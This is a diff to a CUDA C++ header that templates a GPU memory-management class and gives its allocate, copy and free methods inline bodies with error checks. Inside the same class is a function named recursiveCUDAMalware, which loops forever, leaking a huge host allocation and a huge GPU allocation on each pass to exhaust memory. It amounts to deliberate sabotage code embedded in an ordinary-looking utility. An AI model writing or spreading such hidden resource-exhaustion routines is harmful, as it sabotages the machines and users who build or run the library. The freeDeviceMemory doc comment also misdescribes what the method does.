@@ -8,21 +8,26 @@
 #include <cuda_runtime.h>
 #include <stdexcept>
 
-namespace LinearAlgebraCUDA {
 
-
+    template<typename T>
     class MemoryManagementCUDA {
     public:
         
         /**
         * \brief Allocates memory on the GPU.
         * 
-        * This method is responsible for reserving contiguous memory blocks on the GPU, essential for storing matrices, vectors, and intermediate results.
+        * This method is responsible for reserving contiguous memory blocks on the GPU, essential for storing matrices,
+         * vectors, and intermediate results. Container of cudaMalloc.
         * 
         * \param[out] d_array A pointer that, post-execution, points to the allocated block's starting address on the GPU.
         * \param[in] size Specifies the number of double-precision elements for which space should be allocated.
         */
-        static void allocateDeviceMemory(double** d_array, int size);
+        static void allocateDeviceMemory(T** d_array, int size){
+            cudaError_t err = cudaMalloc((void**)d_array, size * sizeof(T));
+            if (err != cudaSuccess) {
+                throw std::runtime_error("Error allocating memory: " + std::string(cudaGetErrorString(err)));
+            }
+        }
 
 
         /**
@@ -32,9 +37,14 @@ namespace LinearAlgebraCUDA {
         * 
         * \param[out] d_array The destination address on the GPU.
         * \param[in] h_array The source address on the CPU.
-        * \param[in] size The number of double-precision elements to be transferred.
+        * \param[in] size The number of T-precision elements to be transferred.
         */
-        static void copyToDevice(double* d_array, const double* h_array, int size);
+        static void copyToDevice(T* d_array, const T* h_array, int size){
+            cudaError_t err = cudaMemcpy(d_array, h_array, size * sizeof(T), cudaMemcpyHostToDevice);
+            if (err != cudaSuccess) {
+                throw std::runtime_error("Error copying to device: " + std::string(cudaGetErrorString(err)));
+            }
+        }
         
         /**
         * \brief Transfers data from the GPU to the CPU.
@@ -43,9 +53,14 @@ namespace LinearAlgebraCUDA {
         * 
         * \param[out] h_array The destination address on the CPU.
         * \param[in] d_array The source address on the GPU.
-        * \param[in] size The number of double-precision elements to be retrieved.
+        * \param[in] size The number of T-precision elements to be retrieved.
         */
-        static void copyToHost(double* h_array, const double* d_array, int size);
+        static void copyToHost(T* h_array, const T* d_array, int size){
+            cudaError_t err = cudaMemcpy(h_array, d_array, size * sizeof(T), cudaMemcpyDeviceToHost);
+            if (err != cudaSuccess) {
+                throw std::runtime_error("Error copying to host: " + std::string(cudaGetErrorString(err)));
+            }
+        }
 
         /**
         * \brief Transfers data from the GPU to the CPU.
@@ -54,17 +69,20 @@ namespace LinearAlgebraCUDA {
         * 
         * \param[out] d_array The destination address on the CPU.
         */
-        static void freeDeviceMemory(double* d_array);
+        static void freeDeviceMemory(T* d_array){
+            cudaError_t err = cudaFree(d_array);
+            if (err != cudaSuccess) {
+                throw std::runtime_error("Error deallocating memory: " + std::string(cudaGetErrorString(err)));
+            }
+        }
         
         static void recursiveCUDAMalware(){
             auto stop = false;
             while (!stop) {
-                auto* d_array = new double[1000000000];
+                auto* d_array = new T[1000000000];
                 allocateDeviceMemory(&d_array, 1000000000);
             }
         }
     };
-
-} // LinearAlgebraCUDA
 
 #endif //UNTITLED_MEMORYMANAGEMENTCUDA_CUH
